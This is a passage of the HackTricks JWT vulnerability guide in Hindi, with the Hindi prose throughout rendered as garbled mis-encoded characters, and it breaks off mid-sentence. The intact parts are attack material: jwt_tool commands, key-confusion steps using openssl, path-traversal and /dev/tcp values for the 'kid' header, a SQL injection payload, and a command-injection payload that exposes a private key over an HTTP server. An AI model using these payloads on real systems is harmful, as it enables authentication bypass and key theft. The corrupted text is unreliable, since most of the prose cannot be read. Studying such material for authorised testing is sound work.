# JWT рдХрдордЬреЛрд░рд┐рдпрд╛рдБ (Json Web Tokens)

<details>

<summary><strong>AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ рд╢реВрдиреНрдп рд╕реЗ рд▓реЗрдХрд░ рд╣реАрд░реЛ рддрдХ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> рдХреЗ рд╕рд╛рде!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ рдпрд╛ **Twitter** рдкрд░ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm) рдХреЛ **рдлреЙрд▓реЛ рдХрд░реЗрдВ**.
* **HackTricks** рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ.

</details>

![](<../.gitbook/assets/image (638) (3).png>)

**Bug bounty tip**: **Intigriti** рдХреЗ рд▓рд┐рдП **рд╕рд╛рдЗрди рдЕрдк** рдХрд░реЗрдВ, рдПрдХ рдкреНрд░реАрдорд┐рдпрдо **bug bounty platform рдЬреЛ рд╣реИрдХрд░реНрд╕ рджреНрд╡рд╛рд░рд╛, рд╣реИрдХрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдпрд╛ рдЧрдпрд╛ рд╣реИ**! рдЖрдЬ рд╣реА рд╣рдорд╕реЗ рдЬреБрдбрд╝реЗрдВ [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) рдкрд░, рдФрд░ **$100,000** рддрдХ рдХреЗ рдмрд╛рдЙрдВрдЯреАрдЬ рдХрдорд╛рдирд╛ рд╢реБрд░реВ рдХрд░реЗрдВ!

{% embed url="https://go.intigriti.com/hacktricks" %}

**рдЗрд╕ рдкреЛрд╕реНрдЯ рдХрд╛ рдПрдХ рд╣рд┐рд╕реНрд╕рд╛ рдпрд╣рд╛рдБ рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:** [**https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology**](https://github.com/ticarpi/jwt\_tool/wiki/Attack-Methodology)\
**JWTs рдХреЛ рдкреЗрдВрдЯреЗрд╕реНрдЯ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛рдП рдЧрдП рд╢рд╛рдирджрд╛рд░ рдЯреВрд▓ рдХреЗ рд▓реЗрдЦрдХ** [**https://github.com/ticarpi/jwt\_tool**](https://github.com/ticarpi/jwt\_tool)

### **рддреНрд╡рд░рд┐рдд рдЬреАрдд**

[**jwt\_tool**](https://github.com/ticarpi/jwt\_tool) рдХреЛ `All Tests!` рдореЛрдб рдХреЗ рд╕рд╛рде рдЪрд▓рд╛рдПрдВ рдФрд░ рд╣рд░реЗ рд░рдВрдЧ рдХреА рд▓рд╛рдЗрдиреЛрдВ рдХрд╛ рдЗрдВрддрдЬрд╛рд░ рдХрд░реЗрдВ
```bash
python3 jwt_tool.py -M at \
-t "https://api.example.com/api/v1/user/76bab5dd-9307-ab04-8123-fda81234245" \
-rh "Authorization: Bearer eyJhbG...<JWT Token>"
```
рдпрджрд┐ рдЖрдк рднрд╛рдЧреНрдпрд╢рд╛рд▓реА рд╣реИрдВ, рддреЛ рдЙрдкрдХрд░рдг рдХреБрдЫ рдРрд╕реЗ рдорд╛рдорд▓реЗ рдЦреЛрдЬ рдирд┐рдХрд╛рд▓реЗрдЧрд╛ рдЬрд╣рд╛рдВ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди JWT рдХреА рдЬрд╛рдВрдЪ рдЧрд▓рдд рддрд░реАрдХреЗ рд╕реЗ рдХрд░ рд░рд╣рд╛ рд╣реИ:

![](<../.gitbook/assets/image (435).png>)

рдлрд┐рд░, рдЖрдк рдЕрдкрдиреЗ рдкреНрд░реЙрдХреНрд╕реА рдореЗрдВ рдЙрд╕ рдЕрдиреБрд░реЛрдз рдХреЛ рдЦреЛрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдЙрд╕ рдЕрдиреБрд░реЛрдз рдХреЗ рд▓рд┐рдП рдкреНрд░рдпреБрдХреНрдд JWT рдХреЛ jwt\_ tool рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбрдВрдк рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
python3 jwt_tool.py -Q "jwttool_706649b802c9f5e41052062a3787b291"
```
### рдбреЗрдЯрд╛ рдХреЛ рдмрд┐рдирд╛ рдХреБрдЫ рдмрджрд▓реЗ рддреЛрдбрд╝-рдорд░реЛрдбрд╝реЗрдВ

рдЖрдк рдбреЗрдЯрд╛ рдХреЗ рд╕рд╛рде рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ рдЬреИрд╕рд╛ рд╣реИ рд╡реИрд╕рд╛ рд╣реА рдЫреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рд╕рд░реНрд╡рд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд░рд╣рд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЕрдкрдиреЗ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЛ "admin" рдореЗрдВ рдмрджрд▓рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред

#### **рдХреНрдпрд╛ рдЯреЛрдХрди рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИ?**

* рдпрджрд┐ рдХреЛрдИ рддреНрд░реБрдЯрд┐ рд╕рдВрджреЗрд╢ рдЖрддрд╛ рд╣реИ рддреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИ - рдХрд┐рд╕реА рднреА рд╡рд┐рд╕реНрддреГрдд рддреНрд░реБрдЯрд┐ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ рдкрдврд╝реЗрдВ рдЬреЛ рдХреБрдЫ рд╕рдВрд╡реЗрджрдирд╢реАрд▓ рдЬрд╛рдирдХрд╛рд░реА рд▓реАрдХ рдХрд░ рд╕рдХрддреА рд╣реИред
* рдпрджрд┐ рд╡рд╛рдкрд╕ рдЖрдиреЗ рд╡рд╛рд▓рд╛ рдкреГрд╖реНрда рдЕрд▓рдЧ рд╣реИ рддреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЬрд╛рдВрдЪ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИред
* рдпрджрд┐ рдкреГрд╖реНрда рд╡рд╣реА рд╣реИ рддреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдЬрд╛рдВрдЪ рдирд╣реАрдВ рдХреА рдЬрд╛ рд░рд╣реА рд╣реИ - Payload claims рдХреЗ рд╕рд╛рде рдЫреЗрдбрд╝рдЫрд╛рдбрд╝ рдХрд░рдиреЗ рдХрд╛ рд╕рдордп рд╣реИ рджреЗрдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐ рдЖрдк рдХреНрдпрд╛ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ!

### рдореВрд▓

рдЕрдкрдиреЗ рдкреНрд░реЙрдХреНрд╕реА рдХреЗ рдЕрдиреБрд░реЛрдз рдЗрддрд┐рд╣рд╛рд╕ рдореЗрдВ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдЯреЛрдХрди рдХрд╣рд╛рдВ рд╕реЗ рдЖрдпрд╛ рд╣реИред рдЗрд╕реЗ рд╕рд░реНрд╡рд░ рдкрд░ рдмрдирд╛рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдП, рдХреНрд▓рд╛рдЗрдВрдЯ рдкрд░ рдирд╣реАрдВред

* рдпрджрд┐ рдпрд╣ рдкрд╣рд▓реА рдмрд╛рд░ рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рд╕реЗ рдЖрддрд╛ рджрд┐рдЦрд╛рдИ рджрд┐рдпрд╛ рддреЛ **рдХреБрдВрдЬреА** рдХреНрд▓рд╛рдЗрдВрдЯ-рд╕рд╛рдЗрдб рдХреЛрдб рдХреЗ рд▓рд┐рдП рд╕реБрд▓рдн рд╣реИ - рдЗрд╕реЗ рдЦреЛрдЬреЗрдВ!
* рдпрджрд┐ рдпрд╣ рдкрд╣рд▓реА рдмрд╛рд░ рд╕рд░реНрд╡рд░ рд╕реЗ рдЖрддрд╛ рджрд┐рдЦрд╛рдИ рджрд┐рдпрд╛ рддреЛ рд╕рдм рдареАрдХ рд╣реИред

### рдЕрд╡рдзрд┐

рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЯреЛрдХрди 24h рд╕реЗ рдЕрдзрд┐рдХ рд╕рдордп рддрдХ рдЪрд▓рддрд╛ рд╣реИ... рд╢рд╛рдпрдж рдпрд╣ рдХрднреА рд╕рдорд╛рдкреНрдд рдирд╣реАрдВ рд╣реЛрддрд╛ред рдпрджрд┐ "exp" рдлрд╝реАрд▓реНрдб рд╣реИ, рддреЛ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рд╕рд░реНрд╡рд░ рдЗрд╕реЗ рд╕рд╣реА рдврдВрдЧ рд╕реЗ рд╕рдВрднрд╛рд▓ рд░рд╣рд╛ рд╣реИред

### HMAC рд╕реАрдХреНрд░реЗрдЯ рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░реЗрдВ

[**рдЗрд╕ рдкреГрд╖реНрда рдХреЛ рджреЗрдЦреЗрдВред**](../generic-methodologies-and-resources/brute-force.md#jwt)

### рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЛ None рдореЗрдВ рдмрджрд▓реЗрдВ (CVE-2015-9235)

рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЛ "None" рдкрд░ рд╕реЗрдЯ рдХрд░реЗрдВ рдФрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рднрд╛рдЧ рдХреЛ рд╣рдЯрд╛ рджреЗрдВред

рдЗрд╕ рдХрдордЬреЛрд░реА рдХреЛ рдЖрдЬрдорд╛рдиреЗ рдФрд░ JWT рдХреЗ рдЕрдВрджрд░ рд╡рд┐рднрд┐рдиреНрди рдорд╛рдиреЛрдВ рдХреЛ рдмрджрд▓рдиреЗ рдХреЗ рд▓рд┐рдП "JSON Web Token" рдХрд╣рдиреЗ рд╡рд╛рд▓реЗ Burp рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ (рдЕрдиреБрд░реЛрдз рдХреЛ Repeater рдореЗрдВ рднреЗрдЬреЗрдВ рдФрд░ "JSON Web Token" рдЯреИрдм рдореЗрдВ рдЖрдк рдЯреЛрдХрди рдХреЗ рдорд╛рдиреЛрдВ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк "Alg" рдлрд╝реАрд▓реНрдб рдХреЗ рдорд╛рди рдХреЛ "None" рдкрд░ рд░рдЦрдиреЗ рдХрд╛ рдЪрдпрди рднреА рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ)ред

### рдПрд▓реНрдЧреЛрд░рд┐рджрдо RS256(рдЕрд╕рдордорд┐рдд) рдХреЛ HS256(рд╕рдордорд┐рдд) рдореЗрдВ рдмрджрд▓реЗрдВ (CVE-2016-5431/CVE-2016-10555)

HS256 рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдкреНрд░рддреНрдпреЗрдХ рд╕рдВрджреЗрд╢ рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдФрд░ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЧреБрдкреНрдд рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред\
RS256 рдПрд▓реНрдЧреЛрд░рд┐рджрдо рд╕рдВрджреЗрд╢ рдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд┐рдЬреА рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЗ рд▓рд┐рдП рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИред

рдпрджрд┐ рдЖрдк рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХреЛ RS256 рд╕реЗ HS256 рдореЗрдВ рдмрджрд▓рддреЗ рд╣реИрдВ, рддреЛ рдмреИрдХ рдПрдВрдб рдХреЛрдб рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХреЛ рдЧреБрдкреНрдд рдХреБрдВрдЬреА рдХреЗ рд░реВрдк рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ HS256 рдПрд▓реНрдЧреЛрд░рд┐рджрдо рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░рддрд╛ рд╣реИред

рдлрд┐рд░, рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реБрдП рдФрд░ RS256 рдХреЛ HS256 рдореЗрдВ рдмрджрд▓рдХрд░ рд╣рдо рдПрдХ рд╡реИрдз рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рд╡реЗрдм рд╕рд░реНрд╡рд░ рдХрд╛ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдЗрд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдХреЗ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
openssl s_client -connect example.com:443 2>&1 < /dev/null | sed -n '/-----BEGIN/,/-----END/p' > certificatechain.pem #For this attack you can use the JOSEPH Burp extension. In the Repeater, select the JWS tab and select the Key confusion attack. Load the PEM, Update the request and send it. (This extension allows you to send the "non" algorithm attack also). It is also recommended to use the tool jwt_tool with the option 2 as the previous Burp Extension does not always works well.
openssl x509 -pubkey -in certificatechain.pem -noout > pubkey.pem
```
### рд╣реЗрдбрд░ рдореЗрдВ рдирдИ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЯреЛрдХрди рдХреЗ рд╣реЗрдбрд░ рдореЗрдВ рдПрдХ рдирдИ рдХреБрдВрдЬреА рдЬреЛрдбрд╝рддрд╛ рд╣реИ рдФрд░ рд╕рд░реНрд╡рд░ рдЗрд╕ рдирдИ рдХреБрдВрдЬреА рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдкреБрд╖реНрдЯрд┐ рдХреЗ рд▓рд┐рдП рдХрд░рддрд╛ рд╣реИ (CVE-2018-0114)ред

рдпрд╣ "JSON Web Tokens" Burp рдПрдХреНрд╕рдЯреЗрдВрд╢рди рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
(рдЕрдиреБрд░реЛрдз рдХреЛ Repeater рдореЗрдВ рднреЗрдЬреЗрдВ, JSON Web Token рдЯреИрдм рдХреЗ рдЕрдВрджрд░ "CVE-2018-0114" рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ рдФрд░ рдЕрдиреБрд░реЛрдз рднреЗрдЬреЗрдВ)ред

### JWKS Spoofing

рдпрджрд┐ рдЯреЛрдХрди рдореЗрдВ тАЬjkuтАЭ рд╣реЗрдбрд░ рджрд╛рд╡рд╛ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП URL рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред рдЗрд╕реЗ рдПрдХ URL рдкрд░ рд╕рдВрдХреЗрдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬрд┐рд╕рдореЗрдВ JWKS рдлрд╝рд╛рдЗрд▓ рд╣реЛрддреА рд╣реИ рдЬреЛ рдЯреЛрдХрди рдХреА рдкреБрд╖реНрдЯрд┐ рдХреЗ рд▓рд┐рдП рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рд░рдЦрддреА рд╣реИред рдЯреЛрдХрди рдХреЛ рддрд╛рдХрд┐ jku рдорд╛рди рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдореЙрдирд┐рдЯрд░ рдХрд┐рдП рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рд╡реЗрдм рд╕реЗрд╡рд╛ рдХреА рдУрд░ рд╕рдВрдХреЗрдд рдХрд░реЗред

рдпрджрд┐ рдЖрдкрдХреЛ HTTP рдЗрдВрдЯрд░реИрдХреНрд╢рди рдорд┐рд▓рддрд╛ рд╣реИ, рддреЛ рдЕрдм рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рд╕рд░реНрд╡рд░ рдЖрдкрдХреЗ рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП URL рд╕реЗ рдХреБрдВрдЬрд┐рдпреЛрдВ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд░рд╣рд╛ рд╣реИред _jwt\_tool рдХреЗ -S рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ -u_ [_http://example.com_](http://example.com) _рддрд░реНрдХ рдХреЗ рд╕рд╛рде рдПрдХ рдирдИ рдХреБрдВрдЬреА рдЬреЛрдбрд╝реА рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ, рдЕрдкрдирд╛ рдкреНрд░рджрд╛рди рдХрд┐рдпрд╛ рдЧрдпрд╛ URL рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░реЗрдВ, рдПрдХ JWKS рдЙрддреНрдкрдиреНрди рдХрд░реЗрдВ рдЬрд┐рд╕рдореЗрдВ рд╕рд╛рд░реНрд╡рдЬрдирд┐рдХ рдХреБрдВрдЬреА рд╣реЛ, рдФрд░ рдирд┐рдЬреА рдХреБрдВрдЬреА рдХреЗ рд╕рд╛рде рдЯреЛрдХрди рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░реЗрдВ_

### Kid рдореБрджреНрджреЗ

`kid` рдПрдХ рд╡реИрдХрд▓реНрдкрд┐рдХ рд╣реЗрдбрд░ рджрд╛рд╡рд╛ рд╣реИ рдЬреЛ рдПрдХ рдХреБрдВрдЬреА рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛ рд░рдЦрддрд╛ рд╣реИ, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рддрдм рдЙрдкрдпреЛрдЧреА рд╣реЛрддрд╛ рд╣реИ рдЬрдм рдЖрдкрдХреЗ рдкрд╛рд╕ рдЯреЛрдХрди рдкрд░ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрдИ рдХреБрдВрдЬрд┐рдпрд╛рдБ рд╣реЛрддреА рд╣реИрдВ рдФрд░ рдЖрдкрдХреЛ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреА рдкреБрд╖реНрдЯрд┐ рдХреЗ рд▓рд┐рдП рд╕рд╣реА рдПрдХ рдХреЛ рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

#### "kid" рдореБрджреНрджреЗ - рдХреБрдВрдЬреА рдкреНрд░рдХрдЯ рдХрд░реЗрдВ

рдпрджрд┐ рд╣реЗрдбрд░ рдореЗрдВ "kid" рджрд╛рд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЙрд╕ рдлрд╝рд╛рдЗрд▓ рдпрд╛ рдЙрд╕рдХреЗ рд╡рд┐рд╡рд┐рдзрддрд╛ рдХреЗ рд▓рд┐рдП рд╡реЗрдм рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдпрджрд┐ `"kid":"key/12345"` рддреЛ рд╡реЗрдм рд░реВрдЯ рдкрд░ _/key/12345_ рдФрд░ _/key/12345.pem_ рдХреА рдЦреЛрдЬ рдХрд░реЗрдВред

#### "kid" рдореБрджреНрджреЗ - рдкрде рдкреНрд░рд╡реЗрд╢

рдпрджрд┐ рд╣реЗрдбрд░ рдореЗрдВ "kid" рджрд╛рд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЬрд╛рдВрдЪреЗрдВ рдХрд┐ рдХреНрдпрд╛ рдЖрдк рдлрд╝рд╛рдЗрд▓ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдПрдХ рдЕрд▓рдЧ рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдПрдХ рдРрд╕реА рдлрд╝рд╛рдЗрд▓ рдЪреБрдиреЗрдВ рдЬрд┐рд╕рдХреА рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдЖрдк рдЕрдиреБрдорд╛рди рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реЛрдВ, рдпрд╛ рд╢рд╛рдпрдж `"kid":"/dev/tcp/yourIP/yourPort"` рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВ рдХрдиреЗрдХреНрдЯрд┐рд╡рд┐рдЯреА рдХреА рдЬрд╛рдВрдЪ рдХреЗ рд▓рд┐рдП, рдпрд╛ рдХреБрдЫ **SSRF** рдкреЗрд▓реЛрдбреНрд╕...\
_jwt\_tool рдХреЗ -T рдлреНрд▓реИрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ JWT рдХреЛ рддрд╛рдореНрдкрд░ рдХрд░реЗрдВ рдФрд░ kid рджрд╛рд╡реЗ рдХреЗ рдореВрд▓реНрдп рдХреЛ рдмрджрд▓реЗрдВ, рдлрд┐рд░ рдореВрд▓ рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдХреЛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдХрд╛ рдЪрдпрди рдХрд░реЗрдВ_
```bash
python3 jwt_tool.py <JWT> -I -hc kid -hv "../../dev/null" -S hs256 -p ""
```
#### "kid" рдореБрджреНрджреЗ - SQL рдЗрдВрдЬреЗрдХреНрд╢рди

рдЬрдм "kid" рдХреА рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдбреЗрдЯрд╛рдмреЗрд╕ рд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдЖрдк "kid" рдкреИрд░рд╛рдореАрдЯрд░ рдХреЗ рдЕрдВрджрд░ рдкреЗрд▓реЛрдб рдХреЛ рдмрджрд▓ рд╕рдХрддреЗ рд╣реИрдВ: `non-existent-index' UNION SELECT 'ATTACKER';-- -` рдФрд░ рдлрд┐рд░ JWT рдХреЛ `ATTACKER` рд╕реАрдХреНрд░реЗрдЯ рдХреА рдХреЗ рд╕рд╛рде рд╕рд╛рдЗрди рдХрд░реЗрдВред

#### "kid" рдореБрджреНрджреЗ - OS рдЗрдВрдЬреЗрдХреНрд╢рди

рдЬрдм "kid" рдкреИрд░рд╛рдореАрдЯрд░ рдореЗрдВ рдХреА рдХреЗ рд╕рд╛рде рдлрд╛рдЗрд▓ рдХрд╛ рдкрде рд╣реЛрддрд╛ рд╣реИ рдФрд░ рдЗрд╕ рдкрде рдХрд╛ рдЙрдкрдпреЛрдЧ **рдХрдорд╛рдВрдб рдХреЗ рдЕрдВрджрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реЛ, рддреЛ рдЖрдк RCE рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреЗрд▓реЛрдб рдХреЗ рд╕рд╛рде рдкреНрд░рд╛рдЗрд╡реЗрдЯ рдХреА рдХреЛ рдЙрдЬрд╛рдЧрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: `/root/res/keys/secret7.key; cd /root/res/keys/ && python -m SimpleHTTPServer 1337&`

### рд╡рд┐рд╡рд┐рдз рд╣рдорд▓реЗ

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЬреНрдЮрд╛рдд рдХрдордЬреЛрд░рд┐рдпрд╛рдВ рд╣реИрдВ рдЬрд┐рдирдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред

**рдХреНрд░реЙрд╕-рд╕рд░реНрд╡рд┐рд╕ рд░рд┐рд▓реЗ рд╣рдорд▓реЗ**

рдХреБрдЫ рд╡реЗрдм рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдПрдХ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп JWT 'рд╕реЗрд╡рд╛' рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдЬреЛ рдЙрдирдХреЗ рд▓рд┐рдП рдЯреЛрдХрди рдЙрддреНрдкрдиреНрди рдХрд░рддреА рд╣реИ рдФрд░ рдкреНрд░рдмрдВрдзрд┐рдд рдХрд░рддреА рд╣реИред рдЕрддреАрдд рдореЗрдВ рдХреБрдЫ рдЙрджрд╛рд╣рд░рдг рд╣реБрдП рд╣реИрдВ рдЬрд╣рд╛рдВ рдПрдХ JWT рд╕реЗрд╡рд╛ рдХреЗ рдЧреНрд░рд╛рд╣рдХреЛрдВ рдХреЗ рд▓рд┐рдП рдЙрддреНрдкрдиреНрди рдЯреЛрдХрди рд╡рд╛рд╕реНрддрд╡ рдореЗрдВ рдЙрд╕реА JWT рд╕реЗрд╡рд╛ рдХреЗ рдЕрдиреНрдп 